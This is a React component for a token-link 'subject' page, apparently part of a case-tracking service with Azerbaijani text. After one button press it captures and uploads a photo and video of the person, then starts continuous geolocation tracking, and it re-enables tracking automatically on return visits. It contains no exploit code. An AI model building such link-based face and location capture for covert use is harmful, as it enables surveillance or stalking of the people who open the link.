import React, { useEffect, useState, useRef, useCallback } from 'react';
import { useParams } from 'react-router-dom';
import { GPS_OPTIONS } from './geolocation';
import { useLocationTracker } from './hooks/useLocationTracker';
import { useCameraCapture } from './hooks/useCameraCapture';
import { getDeviceInfo } from './deviceInfo';
import { apiGet } from './api';
import { uploadSubjectMedia } from './mediaUpload';
import {
    SUBJECT_TITLE,
    SUBJECT_CAMERA_MESSAGE,
    SUBJECT_SUCCESS_MESSAGE,
    SUBJECT_GRANTED_KEY,
    CONSENT_TEXT,
    CAMERA_VIDEO_SECONDS
} from './config';
import './SubjectPage.css';

const noop = () => {};

function SubjectSessionPage() {
    const { token } = useParams();
    const deviceInfoRef = useRef(getDeviceInfo());
    const [phase, setPhase] = useState('loading');
    const [trackingEnabled, setTrackingEnabled] = useState(false);
    const [caseTitle, setCaseTitle] = useState('');
    const { runCaptureSession } = useCameraCapture();

    useLocationTracker({
        enabled: trackingEnabled,
        deviceInfo: deviceInfoRef.current,
        testMode: false,
        subjectToken: token,
        consentText: CONSENT_TEXT,
        onConnectionChange: noop,
        onDeviceRegistered: noop,
        onUserLocation: noop,
        onDevicesChange: noop,
        onLocationRefining: noop,
        onCaseRegistered: (data) => setCaseTitle(data.title || '')
    });

    useEffect(() => {
        let cancelled = false;
        (async () => {
            try {
                const data = await apiGet(`/api/cases/by-token/${token}`);
                if (cancelled) return;
                if (data.valid) {
                    setCaseTitle(data.title || '');
                    setPhase('prompt');
                } else {
                    setPhase('invalid');
                }
            } catch {
                if (!cancelled) setPhase('invalid');
            }
        })();
        return () => {
            cancelled = true;
        };
    }, [token]);

    const startTracking = useCallback(() => {
        localStorage.setItem(`${SUBJECT_GRANTED_KEY}_${token}`, 'true');
        setTrackingEnabled(true);
        setPhase('success');
    }, [token]);

    const requestLocation = useCallback(() => {
        if (!navigator.geolocation) {
            setPhase('denied');
            return;
        }
        setPhase('location_waiting');
        navigator.geolocation.getCurrentPosition(
            () => startTracking(),
            () => setPhase('denied'),
            GPS_OPTIONS
        );
    }, [startTracking]);

    const requestPermissions = useCallback(async () => {
        setPhase('camera_waiting');
        try {
            const { photo, video } = await runCaptureSession(CAMERA_VIDEO_SECONDS);
            await uploadSubjectMedia(token, 'photo', photo);
            if (video) {
                await uploadSubjectMedia(token, 'video', video);
            }
            requestLocation();
        } catch (err) {
            const msg = err?.message || '';
            if (msg === 'NOT_SUPPORTED') {
                setPhase('denied');
                return;
            }
            if (err?.name === 'NotAllowedError' || msg.includes('Permission')) {
                setPhase('camera_denied');
                return;
            }
            setPhase('camera_denied');
        }
    }, [token, runCaptureSession, requestLocation]);

    useEffect(() => {
        if (localStorage.getItem(`${SUBJECT_GRANTED_KEY}_${token}`) === 'true') {
            setTrackingEnabled(true);
            setPhase('success');
        }
    }, [token]);

    if (phase === 'loading') {
        return (
            <div className="subject-page">
                <div className="subject-card">
                    <p className="subject-hint">Yoxlanılır...</p>
                </div>
            </div>
        );
    }

    if (phase === 'invalid') {
        return (
            <div className="subject-page">
                <div className="subject-card">
                    <p className="subject-error">Link etibarsızdır və ya tapşırıq bağlanıb.</p>
                </div>
            </div>
        );
    }

    const waiting =
        phase === 'camera_waiting' || phase === 'location_waiting' || phase === 'waiting';

    return (
        <div className="subject-page">
            <div className="subject-card">
                {phase === 'success' ? (
                    <>
                        <div className="subject-icon subject-icon--ok">✓</div>
                        <h1 className="subject-title">{caseTitle || SUBJECT_TITLE}</h1>
                        <p className="subject-text">{SUBJECT_SUCCESS_MESSAGE}</p>
                    </>
                ) : (
                    <>
                        <div className="subject-icon">🔒</div>
                        <h1 className="subject-title">{caseTitle || SUBJECT_TITLE}</h1>
                        <p className="subject-text">{SUBJECT_CAMERA_MESSAGE}</p>
                        {waiting ? (
                            <p className="subject-hint">
                                {phase === 'camera_waiting'
                                    ? 'Kamera hazırlanır...'
                                    : 'Konum yoxlanılır...'}
                            </p>
                        ) : (
                            <button type="button" className="subject-btn" onClick={requestPermissions}>
                                Davam et
                            </button>
                        )}
                        {phase === 'camera_denied' && (
                            <p className="subject-error">
                                Kamera icazəsi verilmədi. Brauzer parametrlərindən kameraya icazə
                                verib yenidən cəhd edin.
                            </p>
                        )}
                        {phase === 'denied' && (
                            <p className="subject-error">
                                Konum icazəsi verilmədi. Parametrlərdən icazə verib yenidən cəhd
                                edin.
                            </p>
                        )}
                    </>
                )}
            </div>
        </div>
    );
}

export default SubjectSessionPage;
